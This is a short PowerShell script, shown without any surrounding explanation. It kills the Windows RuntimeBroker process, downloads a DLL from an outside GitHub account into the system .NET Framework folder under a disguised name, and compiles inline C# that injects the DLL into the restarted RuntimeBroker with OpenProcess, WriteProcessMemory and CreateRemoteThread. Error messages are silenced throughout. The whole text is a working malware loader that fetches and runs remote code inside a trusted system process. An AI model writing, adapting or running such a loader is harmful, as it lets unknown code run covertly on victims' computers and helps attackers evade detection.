$ErrorActionPreference = 'SilentlyContinue'
$dllPath = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
$processName = 'RuntimeBroker'
$processPath = "$env:SystemRoot\System32\$processName.exe"
Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
New-Item -ItemType Directory -Force -Path (Split-Path $dllPath) | Out-Null
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheMasterHacker2244/Main/main/sbscmp30_mscorwks.dll" -OutFile $dllPath -ErrorAction Stop
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class I{
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
    public static bool X(int pid, string d){
        IntPtr h=OpenProcess(0x1F0FFF,false,pid);
        if(h==IntPtr.Zero) return false;
        IntPtr a=VirtualAllocEx(h,IntPtr.Zero,(uint)((d.Length+1)*2),0x3000,0x4);
        if(a==IntPtr.Zero){ CloseHandle(h); return false; }
        byte[] b=System.Text.Encoding.Unicode.GetBytes(d);
        uint w;
        WriteProcessMemory(h,a,b,(uint)b.Length,out w);
        IntPtr k=GetModuleHandle("kernel32.dll");
        IntPtr l=GetProcAddress(k,"LoadLibraryW");
        IntPtr t=CreateRemoteThread(h,IntPtr.Zero,0,l,a,0,IntPtr.Zero);
        if(t==IntPtr.Zero){ CloseHandle(h); return false; }
        WaitForSingleObject(t,0xFFFFFFFF);
        CloseHandle(t);
        CloseHandle(h);
        return true;
    }
}
'@ -ReferencedAssemblies System.Runtime.InteropServices
Start-Process -FilePath $processPath
Start-Sleep -Seconds 2
$proc = Get-Process -Name $processName -ErrorAction SilentlyContinue
if ($proc) { [I]::X($proc[0].Id, $dllPath) | Out-Null }
